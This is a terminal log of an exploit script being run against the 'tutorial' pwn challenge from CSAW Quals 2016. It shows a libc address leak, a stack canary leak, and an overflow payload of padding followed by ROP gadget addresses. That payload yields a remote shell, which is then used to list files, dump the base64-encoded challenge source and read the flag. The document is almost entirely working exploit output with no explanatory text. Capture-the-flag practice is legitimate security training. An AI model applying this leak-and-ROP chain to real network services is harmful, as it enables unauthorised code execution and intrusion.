avi@debian:~/Documents/csaw_quals_2016_09$ ./pwn200_tutorial_exploit.py
[+] Opening connection to pwn.chal.csaw.io on port 8002: Done
-Tutorial-
1.Manual
2.Practice
3.Quit
>Reference:0x7f3549a44860

puts_leak: 7f3549a44860
139866845040640
0x7f35499d5000
len(system): 8
['-Tutorial-', '\n1.Manual\n2.Practice\n3.Quit\n>Time to test your exploit...\n>ABCD\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x12I\xf2G\xd8\x83Pm\x8d4-Tutorial-']
'ABCD\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x12I\xf2G\xd8\x83Pm\x8d4'
'\x9a{\x9fI5\x7f\x00\x00\xc3\x18\xb5I5\x7f\x00\x00\x90\xb5\xa1I5\x7f\x00\x00'
'\x90\x02\x9fI5\x7f\x00\x00;\x00\x00\x00\x00\x00\x00\x00\x99\xd0\xadI5\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc3\x18\xb5I5\x7f\x00\x00\x85\x98\x9fI5\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05m\xa9I5\x7f\x00\x00'
'\x00\xff\x12I\xf2G\xd8\x83'
00ff1249f247d883
['A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', '\x00', '\xff', '\x12', 'I', '\xf2', 'G', '\xd8', '\x83', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', '\x9a', '{', '\x9f', 'I', '5', '\x7f', '\x00', '\x00', '\x04', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x85', '\x98', '\x9f', 'I', '5', '\x7f', '\x00', '\x00', '\x01', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x90', '\x0e', '\xac', 'I', '5', '\x7f', '\x00', '\x00', '\x9a', '{', '\x9f', 'I', '5', '\x7f', '\x00', '\x00', '\x04', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x85', '\x98', '\x9f', 'I', '5', '\x7f', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x90', '\x0e', '\xac', 'I', '5', '\x7f', '\x00', '\x00', '\x9a', '{', '\x9f', 'I', '5', '\x7f', '\x00', '\x00', '\xc3', '\x18', '\xb5', 'I', '5', '\x7f', '\x00', '\x00', '\x90', '\xb5', '\xa1', 'I', '5', '\x7f', '\x00', '\x00', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A']
[*] Switching to interactive mode

1.Manual
2.Practice
3.Quit
>Time to test your exploit...
>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\xff\x12I�G؃AAAA$
$ id
uid=1000(tutorial) gid=1000(tutorial) groups=1000(tutorial)
$ ls -l
total 24
-rw-rw-r-- 1 root root    45 Sep 16 21:13 flag.txt
-rwxr-xr-x 1 root root 14088 Sep 16 21:33 tutorial
-rw-rw-r-- 1 root root  3258 Sep 16 21:13 tutorial.c
$ base64 tutorial.c | tr '\n' ' '
I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHB3ZC5oPgoj aW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN5cy9zb2Nr ZXQuaD4KI2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8YXJwYS9pbmV0Lmg+CiNpbmNs dWRlIDxuZXRpbmV0L2luLmg+CiNpbmNsdWRlIDxkbGZjbi5oPgojaW5jbHVkZSA8ZXJybm8uaD4K I2luY2x1ZGUgPHNpZ25hbC5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxzdGRpbnQu aD4KCmludCBwcml2KGNoYXIgKnVzZXJuYW1lKSB7CiAgICBzdHJ1Y3QgcGFzc3dkICpwdyA9IGdl dHB3bmFtKHVzZXJuYW1lKTsKICAgIGlmIChwdyA9PSBOVUxMKSB7CiAgICAgICAgZnByaW50Zihz dGRlcnIsICJVc2VyICVzIGRvZXMgbm90IGV4aXN0XG4iLCB1c2VybmFtZSk7CiAgICAgICAgcmV0 dXJuIDE7CiAgICB9CgogICAgaWYgKGNoZGlyKHB3LT5wd19kaXIpICE9IDApIHsKICAgICAgICBw ZXJyb3IoImNoZGlyIik7CiAgICAgICAgcmV0dXJuIDE7CiAgICB9CgoKICAgIGlmIChzZXRncm91 cHMoMCwgTlVMTCkgIT0gMCkgewogICAgICAgIHBlcnJvcigic2V0Z3JvdXBzIik7CiAgICAgICAg cmV0dXJuIDE7CiAgICB9CgogICAgaWYgKHNldGdpZChwdy0+cHdfZ2lkKSAhPSAwKSB7CiAgICAg ICAgcGVycm9yKCJzZXRnaWQiKTsKICAgICAgICByZXR1cm4gMTsKICAgIH0KCiAgICBpZiAoc2V0 dWlkKHB3LT5wd191aWQpICE9IDApIHsKICAgICAgICBwZXJyb3IoInNldHVpZCIpOwogICAgICAg IHJldHVybiAxOwogICAgfQoKICAgIHJldHVybiAwOwp9Cgp2b2lkIGZ1bmMxKGludCBmZCl7CiAg ICAKICAgCgljaGFyIGFkZHJlc3NbNTBdOwoJdm9pZCAoKnB1dHNfYWRkcikoaW50KSA9IGRsc3lt KFJUTERfTkVYVCwicHV0cyIpOwogICAgCXdyaXRlKGZkLCJSZWZlcmVuY2U6IiwxMCk7CglzcHJp bnRmKGFkZHJlc3MsIiVwXG4iLHB1dHNfYWRkci0weDUwMCk7CiAgICAJd3JpdGUoZmQsYWRkcmVz cywxNSk7CgoKICAgIAp9Cgp2b2lkIGZ1bmMyKGludCBmZCl7ICAgIAogICAgY2hhciBwb3ZbMzAw XTsKICAgIGJ6ZXJvKHBvdiwzMDApOyAgICAKCiAgICB3cml0ZShmZCwiVGltZSB0byB0ZXN0IHlv dXIgZXhwbG9pdC4uLlxuIiwyOSk7CiAgICB3cml0ZShmZCwiPiIsMSk7CiAgICByZWFkKGZkLHBv diw0NjApOwogICAgd3JpdGUoZmQscG92LDMyNCk7Cgp9CgogICAKICAgIAp2b2lkIG1lbnUoaW50 IGZkKXsKICAgIHdoaWxlKDEpewogICAgICAgIGNoYXIgb3B0aW9uWzJdOwogICAgICAgIHdyaXRl KGZkLCItVHV0b3JpYWwtXG4iLDExKTsKICAgICAgICB3cml0ZShmZCwiMS5NYW51YWxcbiIsOSk7 CiAgICAgICAgd3JpdGUoZmQsIjIuUHJhY3RpY2VcbiIsMTEpOwogICAgICAgIHdyaXRlKGZkLCIz LlF1aXRcbiIsNyk7CiAgICAgICAgd3JpdGUoZmQsIj4iLDEpOyAgICAgICAgcmVhZChmZCxvcHRp b24sMik7CiAgICAgICAgc3dpdGNoKG9wdGlvblswXSl7CiAgICAgICAgICAgIGNhc2UgJzEnOgog ICAgICAgICAgICAgICAgZnVuYzEoZmQpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAg ICAgIGNhc2UgJzInOgogICAgICAgICAgICAgICAgZnVuYzIoZmQpOwogICAgICAgICAgICAgICAg YnJlYWs7CiAgICAgICAgICAgIGNhc2UgJzMnOgogICAgICAgICAgICAgICAgd3JpdGUoZmQsIllv dSBzdGlsbCBkaWQgbm90IHNvbHZlIG15IGNoYWxsZW5nZS5cbiIsMzgpOwogICAgICAgICAgICAg ICAgcmV0dXJuOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgd3JpdGUoZmQs InVua25vd24gb3B0aW9uLlxuIiwxNik7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9 ICAgIAogICAgfQp9CgppbnQgbWFpbiggaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSApIHsgICAKICBp bnQgZml2ZTsKICBpbnQgbXlpbnQgPSAxOyAgIAogIHN0cnVjdCBzb2NrYWRkcl9pbiBzZXJ2ZXIs Y2xpZW50OyAgICAKICBzaWdlbXB0eXNldCgoc2lnc2V0X3QgKikmZml2ZSk7ICAgCiAgaW50IGlu aXRfZmQgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19TVFJFQU0sIDApOyAgICAgCgogIGlmIChpbml0 X2ZkID09IC0xKSB7CiAgICAgcGVycm9yKCJzb2NrZXQiKTsKICAgICBleGl0KC0xKTsKICB9ICAg CiAgYnplcm8oKGNoYXIgKikgJnNlcnZlciwgc2l6ZW9mKHNlcnZlcikpOyAgIAogIAogIGlmKHNl dHNvY2tvcHQoaW5pdF9mZCxTT0xfU09DS0VULFNPX1JFVVNFQUREUiwmbXlpbnQsc2l6ZW9mKG15 aW50KSkgPT0gLTEpewogICAgcGVycm9yKCJzZXRzb2NrZXQiKTsKICAgICAgZXhpdCgtMSk7CiAg fSAgIAogIAogIHNlcnZlci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsKICBzZXJ2ZXIuc2luX2FkZHIu c19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7CiAgc2VydmVyLnNpbl9wb3J0ID0gaHRvbnMoYXRv aShhcmd2WzFdKSk7ICAgCgogIGlmIChiaW5kKGluaXRfZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikg JnNlcnZlciwgc2l6ZW9mKHNlcnZlcikpID09IC0xKSB7CiAgICAgcGVycm9yKCJiaW5kIik7CiAg ICAgZXhpdCgtMSk7CiAgfSAgIAogIAogIGlmKChsaXN0ZW4oaW5pdF9mZCwyMCkpID09IC0xKXsK ICAgICBwZXJyb3IoImxpc3RlbiIpOwogICAgIGV4aXQoLTEpOwogIH0gICAKICBpbnQgYWRkcl9s ZW4gPSBzaXplb2YoY2xpZW50KTsgICAKCiAgIHdoaWxlICgxKSB7ICAgICAgCgogICAgICAgIGlu dCBmZCA9IGFjY2VwdChpbml0X2ZkLChzdHJ1Y3Qgc29ja2FkZHIgKikmY2xpZW50LChzb2NrbGVu X3QqKSZhZGRyX2xlbik7ICAgICAgCgogICAgIGlmIChmZCA8IDApIHsKICAgICAgICBwZXJyb3Io ImFjY2VwdCIpOwogICAgICAgIGV4aXQoMSk7CiAgICAgfSAgICAgIAogICAgIHBpZF90IHBpZCA9 IGZvcmsoKTsgICAgICAKICAgICAKICAgICBpZiAocGlkID09IC0xKSB7CiAgICAgICBwZXJyb3Io ImZvcmsiKTsKICAgICAgIGNsb3NlKGZkKTsgICAgICAKICAgICB9CiAgICAgIAogICAgIGlmIChw aWQgPT0gMCl7CgkgIGFsYXJtKDE1KTsKICAgICAgICAgIGNsb3NlKGluaXRfZmQpOwoJICBpbnQg dXNlcl9wcml2ID0gcHJpdigidHV0b3JpYWwiKTsKCSAgaWYoIXVzZXJfcHJpdil7CiAgICAgICAg ICAJbWVudShmZCk7CgkJY2xvc2UoZmQpOwoJICAgICAgICBleGl0KDApOwoJICB9CiAgICAgfWVs c2V7CiAgICAgICAgICAgIGNsb3NlKGZkKTsKICAgICAgfSAgIAoKICAgIH0KICBjbG9zZShpbml0 X2ZkKTsKfQoK $
$ cat flag.txt
FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}
